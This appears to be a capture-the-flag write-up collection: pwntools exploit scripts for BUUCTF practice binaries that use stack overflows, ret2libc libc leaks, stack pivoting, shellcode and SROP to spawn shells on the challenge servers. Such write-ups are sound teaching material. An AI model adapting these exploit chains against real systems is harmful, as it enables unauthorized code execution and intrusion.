# buuctf wp part2

[bin file](https://github.com/song-10/notes/tree/master/bin-file)

## ciscn_2019_c_1

```python
from pwn import *
from LibcSearcher import *

context.arch = 'amd64'



elf = ELF('./ciscn_2019_c_1')
puts_plt = elf.sym['puts']
puts_got = elf.got['puts']
main = elf.sym['main']
pop_rdi = 0x0000000000400c83 # pop rdi ; ret
ret = 0x00000000004006b9 # ret


# p = process('./ciscn_2019_c_1')
p = remote('node3.buuoj.cn',26620)
p.sendafter('Input your choice!\n','1\n')
# the program gain our inputs by function gets,
# make sure the end of our input is '\n' or '\x00'

payload = '1'*(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
# leak the puts address in menmory

p.sendafter('encrypted\n',payload+'\n')
p.recvuntil('Ciphertext\n')
p.recvuntil('\n')
puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr,binsh_addr))

p.sendafter('Input your choice!\n','1\n')

payload = '1'*(0x50+0x8) + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) + p64(main)
p.sendline(payload)
sleep(1)
p.interactive()
```

## ciscn_2019_en_2

```python
from pwn import *
from LibcSearcher import *

context.arch = 'amd64'



elf = ELF('./ciscn_2019_en_2')
puts_plt = elf.sym['puts']
puts_got = elf.got['puts']
main = elf.sym['main']
pop_rdi = 0x0000000000400c83 # pop rdi ; ret
ret = 0x00000000004006b9 # ret

p = process('./ciscn_2019_en_2')
# p = remote('node3.buuoj.cn',27761)
p.sendafter('Input your choice!\n','1\n')
# the program gain our inputs by function gets,
# make sure the end of our input is '\n' or '\x00'

payload = '1'*(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
# leak the puts address in menmory

p.sendafter('encrypted\n',payload+'\n')
p.recvuntil('Ciphertext\n')
p.recvuntil('\n')
puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr,binsh_addr))

p.sendafter('Input your choice!\n','1\n')

payload = '1'*(0x50+0x8) + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) + p64(main)
p.sendline(payload)

sleep(1)
p.interactive()
```

## ciscn_2019_es_2

```python
from pwn import *
context.arch='i386'

# the program has a function which call the system,
# but could not get shell by this function,
# meanwhile the length of input was limit to make rop list,
# but we can contrl stack by stack pivot(cover the value of ebp on stack),
# before that, we can leak a stack address by first input,
# and calculate the offset by leak data to forge a fake stack

p = remote('node3.buuoj.cn',26676)
# p = process('./ciscn_2019_es_2')
elf = ELF('./ciscn_2019_es_2',checksec=False)

p.recvuntil("What's your name?")
p.send('a'*(0x20+7)+'b')
p.recvuntil('b')
stack_addr = u32(p.recv(4))
log.success('stack_addr = %#x',stack_addr)

payload = 'a'*8 + p32(stack_addr -0x28) + p32(elf.sym['system']) + p32(elf.sym['main']) + p32(stack_addr-0x20) + '/bin/sh\x00'
payload = payload.ljust(0x28,'p') + p32(stack_addr-0x2c) # stack pivot
# the leak stack address is not the current function's ebp,
# need to debug for finding offset between leak stack and inputs on stack
# there are something need to look out,
# that could not to point to a stack address(system),
# we need to contrl stack,and get shell by 'leave ret'*2
p.send(payload)
sleep(1)
p.interactive()
```

## ciscn_2019_n_1

```python
from pwn import *

# 0x41348000 = 11.28125

# p = process('./ciscn_2019_n_1')
p = remote('node3.buuoj.cn',26941)

p.recv()
payload = 'a'*(0x30-0x4) + p64(0x41348000)
p.sendline(payload)
sleep(1)    # Prevent string read failure
print p.recv()
```

## ciscn_2019_n_5

```python
    from pwn import *
    from LibcSearcher import *
    context(arch='amd64',os='linux')

    # the program disabled NX,
    # and there is a read could get inputs to bss segement,
    # so we can get shell by shellcode easliy
    # also we could make rop attack to get shell locally

    # p = process('./ciscn_2019_n_5')
    p = remote('node3.buuoj.cn',26080)

    def roplist(p):
        elf = ELF('./ciscn_2019_n_5',checksec=False)

        puts_plt = elf.sym['puts']
        read_got = elf.got['read']
        main = elf.sym['main']

        pop_rdi = 0x0000000000400713 # pop rdi ; ret
        ret = 0x00000000004004c9 # ret
        binsh_bss = 0x601080

        p.recvuntil("tell me your name\n")
        p.send('123')

        p.recvuntil("What do you want to say to me?\n")

        payload = 'A'*(0x20+8)
        payload += flat([ret, pop_rdi, read_got, puts_plt, main])
        p.sendline(payload)
        read_addr = u64(p.recv(7).ljust(8,'\x00'))
        log.success('read_addr = %#x',read_addr)

        libc = LibcSearcher('read',read_addr)
        libc_base = read_addr - libc.dump('read')
        system_addr = libc_base + libc.dump('system')
        binsh = libc_base + libc.dump('str_bin_sh')
        log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

        p.recvuntil("tell me your name\n")
        p.send('/bin/sh\x00')

        p.recvuntil("What do you want to say to me?\n")
        payload = 'A'*(0x20+8)
        # payload += flat([ret, pop_rdi, binsh, system_addr, main])
        payload += flat([ret, pop_rdi, binsh_bss, system_addr, main])
        p.send(payload)
        sleep(1)
        p.interactive()

    def Shellcode(p):
        ret = 0x00000000004004c9 # ret
        shellcode_bss = 0x601080
        p.recvuntil("tell me your name")
        p.send(asm(shellcraft.sh()))
        p.recvuntil("What do you want to say to me?")

        # payload = 'A'*(0x20+8) + p64(shellcode_bss)
        payload = 'A'*0x28 + p64(ret) + p64(shellcode_bss)
        p.sendline(payload)
        sleep(1)
        p.interactive()

    # roplist(p)
    # roplist could get shell locally
    Shellcode(p)
    # Sehllcode could get shell both server and locally
```

## ciscn_2019_n_8

```python
from pwn import *
context.arch='i386'

# p = process('./ciscn_2019_n_8')
p = remote('node3.buuoj.cn',26085)

p.sendlineafter("What's your name?\n",p32(17)*14)
'''
pass the judgement:
    ...
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 17LL ))
    ...
   at the beginning of the program, var[14] and var[13] was set to zero,
   and from the assembly code we know the first judgement is compare var[13] adn var[14],
   so when we padding, the value of var[14] can't be covered
'''
sleep(1)
p.interactive()
```

## ciscn_2019_ne_5

```python
from pwn import *
from LibcSearcher import *
context.arch='i386'

# 1.Add a log.
# 2.Display all logs
# 3.Print all logs
# 0.Exit
# option 1 get inputs,
# option 2 puts(inputs),
# option 3 call system to ehco somthing,
# there is a hidden options 4 ,it call function GetFlag,
# which contains strcpy that we can make stack overflow

p = process('./ciscn_2019_ne_5')
# p = remote('node3.buuoj.cn',27059)
elf = ELF('./ciscn_2019_ne_5',checksec=False)

sh_addr=0x80482ea   # string sh
# use the string 'fflush' form function fflush in 0x080482E6

p.recvuntil('Please input admin password:')
p.sendline('administrator')
p.recvuntil('Exit\n')
p.sendline('1')
p.recvuntil("Please input new log info:")

payload = 'A'*(0x48+4)
payload += flat(elf.plt['system'], elf.sym['main'], sh_addr)
p.sendline(payload)
p.sendline('4') # call function GetFlag to make stack overflow
sleep(1)
p.interactive()
```

## ciscn_2019_s_3

```python
    from pwn import *
    context.arch='amd64'

    elf = ELF('./ciscn_s_3')
    bss_addr = elf.bss()
    syscall_addr = 0x0400517 # syscall; ret;
    # p = process('./ciscn_s_3')
    p = remote('node3.buuoj.cn',28496)

    def bySROP(p):
        # read the '/bin/sh' and call execve('bin/sh',0,0) by frame_read
        # the process call execve('bin/sh',0,0) was execved by frame_execve
        set_rax = 0x4004da # mov    $0xf,%rax; retq;
        # the singreturn number is 0xf in amd64

        frame_read = SigreturnFrame()
        frame_read.rax = constants.SYS_read
        frame_read.rdi = 0
        frame_read.rsi = bss_addr   # read payload to bss which include strings 'bin/sh'
        frame_read.rdx = 0x300
        frame_read.rsp = bss_addr+0x10 # after call read, pass the strings '/bin/sh' to call execve('bin/sh',0,0)
        frame_read.rip = syscall_addr

        payload = 'A'*0x10 + flat([set_rax, syscall_addr])
        payload += str(frame_read)
        p.send(payload)
        sleep(1)

        frame_execve = SigreturnFrame()
        frame_execve.rax = constants.SYS_execve
        frame_execve.rdi = bss_addr
        frame_execve.rsi = 0
        frame_execve.rdx = 0
        frame_execve.rip = syscall_addr

        payload = '/bin/sh\x00'
        payload += 'A'*(0x10-len(payload))
        payload += flat([set_rax,syscall_addr])
        payload += str(frame_execve)

        p.send(payload)
        sleep(1)
        p.interactive()

    bySROP(p)
```
